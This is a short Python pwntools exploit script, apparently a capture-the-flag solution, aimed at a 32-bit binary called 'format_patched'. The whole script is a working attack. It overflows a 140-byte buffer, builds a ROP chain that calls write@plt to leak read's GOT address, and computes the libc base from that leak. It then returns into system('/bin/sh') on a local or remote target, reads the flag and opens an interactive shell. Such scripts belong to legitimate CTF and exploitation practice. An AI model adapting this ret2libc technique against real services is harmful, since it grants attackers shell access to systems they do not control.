from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b* 0x80488ac
continue
'''.format(**locals())

#Binary filename
exe = './format_patched'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()
libc = ELF('./libc_32.so.6')

main = elf.sym['gee']

p.recvuntil(b"\n\n")
payload = b"a" * 140 + p32(elf.plt.write) + p32(main) + p32(1)
payload += p32(elf.got.read) + p32(4)
p.sendline(payload)

leak = unpack(p.recv(4))
libc.address = leak - libc.sym['read']
payload = b"a" * 140 + p32(libc.sym['system']) + b"BBBB" + p32(next(libc.search(b"/bin/sh")))
p.sendline(payload)

p.sendline(b"cat flag")
# p.recvuntil(b"}\n")
pause()
p.interactive()
